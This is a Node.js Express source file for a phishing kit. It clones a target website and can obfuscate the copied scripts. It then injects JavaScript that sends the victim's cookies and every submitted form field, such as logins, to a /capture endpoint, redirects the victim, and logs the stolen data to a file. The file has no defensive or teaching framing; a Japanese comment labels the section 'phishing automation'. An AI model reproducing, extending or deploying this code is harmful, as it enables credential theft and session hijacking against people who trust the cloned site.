const express = require('express');
const axios = require('axios');
const cheerio = require('cheerio');
const archiver = require('archiver');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const JavaScriptObfuscator = require('javascript-obfuscator');
const { minify: minifyHTML } = require('html-minifier-terser');
const CleanCSS = require('clean-css');
const UglifyJS = require('uglify-js');

const app = express();
app.use(express.json());
app.use(express.static('public'));

async function fetchResource(url, baseUrl) {
    try {
        const fullUrl = new URL(url, baseUrl).href;
        const response = await axios.get(fullUrl, {
            responseType: 'arraybuffer',
            timeout: 10000,
            headers: {
                'User-Agent': 'Mozilla/5.0'
            }
        });
        return response.data;
    } catch(e) {
        return null;
    }
}

function randomName(ext) {
    return crypto.randomBytes(10).toString('hex') + '.' + ext;
}

function obfuscateJS(code) {
    try {
        return JavaScriptObfuscator.obfuscate(code, {
            compact: true,
            controlFlowFlattening: true,
            deadCodeInjection: true,
            stringArray: true,
            stringArrayThreshold: 0.75
        }).getObfuscatedCode();
    } catch(e) {
        return code;
    }
}

function minifyCSS(code) {
    try {
        return new CleanCSS({ level: 2 }).minify(code).styles;
    } catch(e) {
        return code;
    }
}

function minifyJS(code) {
    try {
        return UglifyJS.minify(code).code;
    } catch(e) {
        return code;
    }
}

async function cloneSiteDeep(url, config) {
    const response = await axios.get(url, {
        timeout: 15000,
        headers: {
            'User-Agent': 'Mozilla/5.0'
        }
    });
    
    let html = response.data;
    const $ = cheerio.load(html);
    const resources = {};
    const resourceMap = {};
    let resourceCount = 0;
    
    const maxResources = config.clone.maxResources || Infinity;
    
    // CSS
    if (config.clone.css) {
        const cssLinks = [];
        $('link[rel="stylesheet"]').each((i, el) => {
            const href = $(el).attr('href');
            if (href && !href.startsWith('data:') && resourceCount < maxResources) {
                cssLinks.push(href);
            }
        });
        
        for (const cssUrl of cssLinks) {
            if (resourceCount >= maxResources) break;
            
            const fullUrl = new URL(cssUrl, url).href;
            const content = await fetchResource(fullUrl, url);
            if (content) {
                let cssCode = content.toString();
                if (config.output.minify) {
                    cssCode = minifyCSS(cssCode);
                }
                
                const filename = config.output.randomizeNames ? randomName('css') : path.basename(cssUrl);
                resources[filename] = cssCode;
                resourceMap[cssUrl] = filename;
                resourceMap[fullUrl] = filename;
                resourceCount++;
            }
        }
    }
    
    // JS
    if (config.clone.js) {
        const jsFiles = [];
        $('script[src]').each((i, el) => {
            const src = $(el).attr('src');
            if (src && !src.startsWith('data:') && resourceCount < maxResources) {
                jsFiles.push(src);
            }
        });
        
        for (const jsUrl of jsFiles) {
            if (resourceCount >= maxResources) break;
            
            const fullUrl = new URL(jsUrl, url).href;
            const content = await fetchResource(fullUrl, url);
            if (content) {
                let jsCode = content.toString();
                if (config.output.obfuscate) {
                    jsCode = obfuscateJS(jsCode);
                } else if (config.output.minify) {
                    jsCode = minifyJS(jsCode);
                }
                
                const filename = config.output.randomizeNames ? randomName('js') : path.basename(jsUrl);
                resources[filename] = jsCode;
                resourceMap[jsUrl] = filename;
                resourceMap[fullUrl] = filename;
                resourceCount++;
            }
        }
    }
    
    // 画像
    if (config.clone.images) {
        const images = [];
        $('img').each((i, el) => {
            const src = $(el).attr('src');
            if (src && !src.startsWith('data:') && resourceCount < maxResources) {
                images.push(src);
            }
        });
        
        for (const imgUrl of images) {
            if (resourceCount >= maxResources) break;
            
            const fullUrl = new URL(imgUrl, url).href;
            const content = await fetchResource(fullUrl, url);
            if (content) {
                const ext = path.extname(imgUrl).slice(1) || 'png';
                const filename = config.output.randomizeNames ? randomName(ext) : path.basename(imgUrl);
                resources[filename] = content;
                resourceMap[imgUrl] = filename;
                resourceMap[fullUrl] = filename;
                resourceCount++;
            }
        }
    }
    
    // HTML内のパス置換
    for (const [originalUrl, newFilename] of Object.entries(resourceMap)) {
        const escapedUrl = originalUrl.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
        html = html.replace(new RegExp(escapedUrl, 'g'), newFilename);
    }
    
    // ============================================
    // フィッシング自動化
    // ============================================
    if (config.phishing.enabled) {
        let phishingScript = '<script>';
        
        if (config.phishing.captureCookies) {
            phishingScript += `
            fetch('/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    type: 'cookies',
                    url: '${url}',
                    data: document.cookie,
                    userAgent: navigator.userAgent,
                    timestamp: Date.now()
                })
            });
            `;
        }
        
        if (config.phishing.captureForm) {
            phishingScript += `
            document.addEventListener('DOMContentLoaded', () => {
                document.querySelectorAll('form').forEach(form => {
                    form.addEventListener('submit', (e) => {
                        e.preventDefault();
                        
                        const formData = {};
                        form.querySelectorAll('input, select, textarea').forEach(input => {
                            if (input.name) {
                                formData[input.name] = input.value;
                            }
                        });
                        
                        fetch('/capture', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                type: 'form',
                                url: '${url}',
                                data: formData,
                                cookies: document.cookie,
                                userAgent: navigator.userAgent,
                                timestamp: Date.now()
                            })
                        }).then(() => {
                            ${config.phishing.redirectUrl ? `window.location.href = '${config.phishing.redirectUrl}';` : ''}
                        });
                    });
                });
            });
            `;
        }
        
        phishingScript += '</script>';
        html = html.replace('</body>', phishingScript + '</body>');
    }
    
    // HTML minify
    if (config.output.minify) {
        html = await minifyHTML(html, {
            collapseWhitespace: true,
            removeComments: true,
            removeRedundantAttributes: true,
            removeScriptTypeAttributes: true,
            removeStyleLinkTypeAttributes: true
        });
    }
    
    resources['index.html'] = html;
    
    return resources;
}

app.post('/capture', (req, res) => {
    const data = req.body;
    const log = `[${new Date().toISOString()}] ${JSON.stringify(data)}\n`;
    fs.appendFileSync('captured.log', log);
    console.log('Captured:', JSON.stringify(data, null, 2));
    res.json({ success: true });
});

app.post('/clone', async (req, res) => {
    const config = req.body;
    
    try {
        const resources = await cloneSiteDeep(config.url, config);
        
        const archive = archiver('zip', { zlib: { level: 9 } });
        res.setHeader('Content-Type', 'application/zip');
        res.setHeader('Content-Disposition', `attachment; filename=clone_${Date.now()}.zip`);
        
        archive.pipe(res);
        
        Object.entries(resources).forEach(([filename, content]) => {
            archive.append(content, { name: filename });
        });
        
        archive.finalize();
    } catch(e) {
        res.status(500).json({ error: e.message });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Clone server running on ${PORT}`);
});
